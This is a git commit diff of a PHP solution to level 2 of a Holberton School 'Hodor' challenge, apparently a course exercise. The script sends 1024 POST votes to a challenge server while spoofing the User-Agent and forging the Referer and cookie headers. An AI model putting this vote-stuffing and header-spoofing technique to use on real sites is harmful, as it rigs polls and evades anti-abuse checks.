f74676daaf97e79c776dc16671b23e9dc2a5b1cd
Alexandro de Oliveira <alexandro.oliveira@holbertonschool.com>
2016-06-01 22:05:08 -0300

    Adding solution to Hodor level 2 using PHP script

--- hodor/level_2/hodor2-PHP.php
+++ hodor/level_2/hodor2-PHP.php
@@ -1,6 +1,6 @@
 /*
  * ===---Description------------------------------------------------------------===
- *   Solution for the Hodor Project, Level 1 by Julien Barbier.
+ *   Solution for the Hodor Project, Level 2 by Julien Barbier.
  *   Using PHP through command line.
  *
  *   by Alexandro de Oliveira, for Holberton School
@@ -15,14 +15,15 @@
 <?php
 $votes = (1 << 10);	// Total amount of desire votes.
 $counter = 1;		// Initializing the counter.
-$url = 'http://173.246.108.142/level1.php';
+$url = 'http://173.246.108.142/level2.php';
 $cookie = "c63e8f4583e0fc89436699268e402b6a441281c9";
 $data = array('id' => '23', 'holdthedoor' => 'submit', 'key' => $cookie);
 $options = array(
     'http' => array(
         'header'  => "Content-type: application/x-www-form-urlencoded\r\n" . //Spliting the line
-                     "User-Agent: havk64 - PHP Requests\r\n" .
-                     "Cookie: HoldTheDoor=" . $cookie . "\r\n",
+                     "User-Agent: Windows NT 5.1 - (Spoofing the User-Agent) havk64 - PHP Requests\r\n" . //through...
+                     "Cookie: HoldTheDoor=" . $cookie . "\r\n" . // multiple ...
+                     "Referer: " . $url . "\r\n", // lines.
         'method'  => 'POST',
         'content' => http_build_query($data)
     )
@@ -37,4 +38,5 @@ for ($i = 0; $i < $votes; $i++) {
             echo "Connection error...(vote not computed)\n";
         endif;
 }
+echo "\nBOOOOOMMMMMM ! ! !\n\o/ \o/ \o/";
 ?>
